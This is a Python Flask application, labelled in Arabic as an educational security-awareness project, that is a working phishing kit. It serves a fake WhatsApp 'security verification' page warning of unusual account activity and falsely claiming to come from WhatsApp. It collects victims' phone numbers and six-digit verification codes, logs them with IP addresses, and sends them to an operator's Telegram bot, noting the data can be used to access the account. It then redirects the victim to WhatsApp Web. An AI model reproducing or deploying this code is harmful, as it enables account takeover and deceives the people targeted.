"""
تطبيق تحقق أمان واتساب - WhatsApp Security Verification
مشروع تعليمي لأغراض التوعية الأمنية
"""

from flask import Flask, request, render_template_string, jsonify
import requests
import time
from datetime import datetime
import threading
import os
from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, SERVER_HOST, SERVER_PORT

app = Flask(__name__)

class TelegramManager:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{bot_token}/"
        self.test_connection()
    
    def test_connection(self):
        """اختبار اتصال البوت"""
        try:
            message = "🔔 **بدء التشغيل**\nتم تشغيل نظام التحقق بنجاح!\n- البوت: متصل ✅\n- الخادم: جاهز ✅"
            self.send_message(message)
            print("✅ اتصال البوت ناجح!")
        except Exception as e:
            print(f"❌ خطأ في الاتصال: {e}")
    
    def send_message(self, text):
        """إرسال رسالة إلى تليجرام"""
        try:
            url = self.base_url + "sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            response = requests.post(url, data=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            print(f"❌ خطأ في إرسال الرسالة: {e}")
            return False

# إنشاء مدير التليجرام
telegram_bot = TelegramManager(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)

def save_to_log(filename, data):
    """حفظ البيانات في ملف"""
    try:
        with open(f"logs/{filename}", "a", encoding="utf-8") as f:
            f.write(data + "\n")
    except Exception as e:
        print(f"❌ خطأ في حفظ الملف: {e}")

# إنشاء مجلد السجلات
os.makedirs("logs", exist_ok=True)

# قالب HTML للصفحة
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من أمان واتساب</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #128C7E, #25D366);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 450px;
            text-align: center;
        }
        
        .logo {
            font-size: 4em;
            margin-bottom: 20px;
        }
        
        .title {
            color: #128C7E;
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: bold;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 16px;
            line-height: 1.6;
        }
        
        .alert {
            background: #ffeaa7;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 25px;
            border-right: 5px solid #fdcb6e;
            text-align: right;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: bold;
        }
        
        input[type="text"],
        input[type="tel"],
        input[type="number"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        input:focus {
            border-color: #25D366;
            outline: none;
            box-shadow: 0 0 10px rgba(37, 211, 102, 0.3);
        }
        
        .btn {
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: white;
            padding: 16px 40px;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.4);
        }
        
        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h1 class="title">تحقق من أمان واتساب</h1>
        <p class="subtitle">لحماية حسابك من الاختراق، يرجى إكمال عملية التحقق</p>
        
        <div class="alert">
            <strong>⚠️ تنبيه أمني:</strong> تم اكتشاف نشاط غير معتاد على حسابك
        </div>
        
        <form method="POST" action="/verify">
            <div class="form-group">
                <label for="phone">رقم الهاتف:</label>
                <input type="tel" id="phone" name="phone" placeholder="+966501234567" required>
            </div>
            
            <div class="form-group">
                <label for="code">رمز التحقق:</label>
                <input type="number" id="code" name="code" placeholder="أدخل الرمز المكون من 6 أرقام" required maxlength="6">
            </div>
            
            <button type="submit" class="btn">تحقق وتأمين الحساب</button>
        </form>
        
        <div class="footer">
            هذا التحقق مقدم من واتساب لحماية حسابك من الوصول غير المصرح به
        </div>
    </div>
    
    <script>
        // تتبع التفاعلات
        document.addEventListener('click', function() {
            fetch('/track/click');
        });
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    """الصفحة الرئيسية"""
    visitor_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # تسجيل الزائر
    log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] زيارة - IP: {visitor_ip}"
    save_to_log("visitors.log", log_entry)
    
    # إرسال إشعار تليجرام
    message = f"👤 زائر جديد\n🌐 IP: {visitor_ip}\n🕒 {datetime.now().strftime('%H:%M:%S')}"
    threading.Thread(target=telegram_bot.send_message, args=(message,)).start()
    
    return render_template_string(HTML_TEMPLATE)

@app.route('/verify', methods=['POST'])
def verify():
    """معالجة التحقق"""
    phone = request.form.get('phone', '')
    code = request.form.get('code', '')
    ip_address = request.remote_addr
    
    # تسجيل البيانات
    data_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] هاتف: {phone} | رمز: {code} | IP: {ip_address}"
    save_to_log("data.log", data_entry)
    
    # إرسال إلى تليجرام
    message = f"""
🎯 تم الحصول على بيانات التحقق

📱 الرقم: {phone}
🔐 الرمز: {code}  
🌐 IP: {ip_address}
🕒 الوقت: {datetime.now().strftime('%H:%M:%S')}

⚠️ يمكن استخدام هذه البيانات للوصول إلى الحساب
"""
    threading.Thread(target=telegram_bot.send_message, args=(message,)).start()
    
    # عرض صفحة النجاح
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>تم التحقق بنجاح</title>
        <style>
            body { 
                background: #25D366; 
                color: white; 
                text-align: center; 
                padding: 100px 20px;
                font-family: Arial;
            }
            .check { font-size: 4em; margin-bottom: 20px; }
        </style>
    </head>
    <body>
        <div class="check">✅</div>
        <h2>تم التحقق من حسابك بنجاح!</h2>
        <p>جاري توجيهك إلى واتساب...</p>
        <script>
            setTimeout(function() {
                window.location.href = "https://web.whatsapp.com";
            }, 3000);
        </script>
    </body>
    </html>
    '''

@app.route('/track/<action>')
def track(action):
    """تتبع التفاعلات"""
    ip = request.remote_addr
    telegram_bot.send_message(f"🖱️ تفاعل: {action} من IP: {ip}")
    return jsonify({"status": "tracked"})

if __name__ == '__main__':
    print("🚀 جاري تشغيل خادم التحقق الأمني...")
    print(f"📍 العنوان: http://{SERVER_HOST}:{SERVER_PORT}")
    print("📧 الإشعارات ترسل تلقائياً إلى تليجرام")
    print("⏹️  لإيقاف الخادم: Ctrl+C")
    
    app.run(host=SERVER_HOST, port=SERVER_PORT, debug=DEBUG_MODE)
